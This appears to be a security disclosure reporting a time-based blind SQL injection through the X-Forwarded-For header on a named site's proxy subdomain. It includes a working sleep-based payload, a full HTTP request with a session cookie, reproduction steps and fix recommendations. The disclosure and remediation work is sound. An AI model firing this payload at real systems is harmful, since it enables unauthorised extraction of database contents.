# Time-Based Blind SQL Injection via X-Forwarded-For Header (Proxy Subdomain)

## Vulnerability Type
SQL Injection (Blind, Time-Based, HTTP Header-based) - CWE-89

## Summary
The `X-Forwarded-For` HTTP header is not sanitized before being used in a backend SQL query on the proxy subdomain, most likely as part of IP/client-tracking or access-logging logic. Injecting conditional SQL logic via this header causes a measurable response delay, confirming the header value is concatenated directly into a SQL statement without parameterization. As with the User-Agent and Referer findings, this is exploitable without touching any visible form or parameter — `X-Forwarded-For` is fully attacker-controlled and commonly used by WAFs/load balancers for IP logging, which makes this an especially easy vector for automated/bulk exploitation.

## Vulnerable Endpoint
```
GET https://kzlabs.in/subdomains/proxy/
```

## Steps to Reproduce
1. Intercept a GET request to `/subdomains/proxy/` in Burp Suite.
2. Replace the `X-Forwarded-For` header value with the payload below.
3. Send the request and observe a ~10 second response delay compared to the baseline (sub-second) response with a normal/absent X-Forwarded-For header.
4. Re-send to confirm the delay is consistent and reproducible.
5. (Recommended follow-up) Check whether an admin/logging panel displays IP/X-Forwarded-For data - if so, test for second-order SQLi or stored XSS there as well.

## Request
```
GET /subdomains/proxy/ HTTP/2
Host: kzlabs.in
Cookie: PHPSESSID=r8dph5268d9neutemcc1q42p9k
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/154.0.0.0 Safari/537.36
Referer: https://kzlabs.in/
X-Forwarded-For: 1'XOR(94102*if(now()=sysdate(),sleep(10),0))XOR'Z
```

## Payload Used
```
1'XOR(94102*if(now()=sysdate(),sleep(10),0))XOR'Z
```

## Impact
- **Confidentiality:** Blind extraction of database contents via time-based inference - likely scoped to IP/access logs, potentially linked to session or user activity data.
- **Attack surface breadth:** Header-based, unauthenticated, and trivially automatable since `X-Forwarded-For` requires no cookies or prior interaction to spoof.
- **Stored/second-order risk:** If the header value is logged and later rendered or queried in an admin/monitoring dashboard, this could escalate to stored SQLi or stored XSS.
- **Severity:** High - unauthenticated, no user interaction required, broad exploitability via header injection.

## Recommendations for Fix
1. **Parameterized queries/prepared statements** for any logging query that incorporates the `X-Forwarded-For` header or any other client-supplied header.
2. **Treat all HTTP headers as untrusted input** - this application has now shown the same flaw across User-Agent, Referer, and X-Forwarded-For; any header reaching a SQL query must be parameterized, not just these three.
3. **Output encoding** wherever logged IP/header values are later displayed.
4. **Least-privilege DB account** so the web app's DB user cannot access data beyond what logging requires.
5. **WAF rule** to block SQLi patterns in HTTP headers as an interim mitigation while the code fix is deployed.
6. **Full source-level audit required:** this is the ninth endpoint found vulnerable to the identical injection pattern, spanning forms, GET parameters, and three separate HTTP headers. This is no longer a per-endpoint bug — it is a single unsanitized query-building utility used throughout the codebase, and the only durable fix is a centralized rewrite of that data-access layer to use parameterized queries everywhere, followed by a full regression test across every endpoint.
